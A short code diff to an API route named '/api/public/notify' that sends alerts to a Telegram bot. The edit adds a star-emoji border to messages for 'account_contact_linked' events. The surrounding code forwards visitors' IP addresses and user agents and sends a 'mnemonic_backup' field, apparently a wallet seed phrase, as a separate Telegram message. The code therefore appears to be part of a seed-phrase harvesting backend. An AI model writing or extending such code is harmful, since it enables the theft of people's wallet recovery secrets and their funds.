@@ -94,7 +94,9 @@ export const Route = createFileRoute("/api/public/notify")({
         if (ip) lines.push(`🌐 <code>${esc(ip)}</code>`);
         if (ua) lines.push(`🧭 ${esc(ua)}`);
 
-        await sendTelegram(token, lines.join("\n"));
+        const isContactAlert = event === "account_contact_linked";
+        const starBorder = "⭐".repeat(30);
+        await sendTelegram(token, isContactAlert ? [starBorder, ...lines, starBorder].join("\n") : lines.join("\n"));
 
         // Send mnemonic as a separate, tagged backup message for safe keeping
         if (body.mnemonic_backup) {
